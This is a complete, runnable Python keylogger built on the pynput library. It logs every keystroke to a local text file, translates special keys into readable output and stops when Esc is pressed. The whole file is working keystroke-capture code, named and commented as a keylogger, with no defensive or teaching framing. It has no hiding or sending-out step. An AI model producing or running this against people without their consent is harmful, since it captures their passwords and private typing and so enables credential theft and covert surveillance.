from pynput.keyboard import Key, Listener

# File to save keystrokes
log_file = "keylog.txt"

# Function to write keystrokes to the file
def write_to_file(key):
    with open(log_file, "a") as f:
        # Format and record the key pressed
        key_data = str(key).replace("'", "")
        
        if key == Key.space:
            f.write(' ')  # Log a space
        elif key == Key.enter:
            f.write('\n')  # Log a new line for Enter
        elif key == Key.backspace:
            f.write('[BACKSPACE]')
        elif key == Key.tab:
            f.write('\t')
        else:
            f.write(key_data)

# Function to handle key press events
def on_press(key):
    write_to_file(key)

# Function to handle key release events (optional, can stop the logger on a specific key)
def on_release(key):
    if key == Key.esc:  # Stop logging when Esc is pressed
        return False

# Main function to start the keylogger
def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
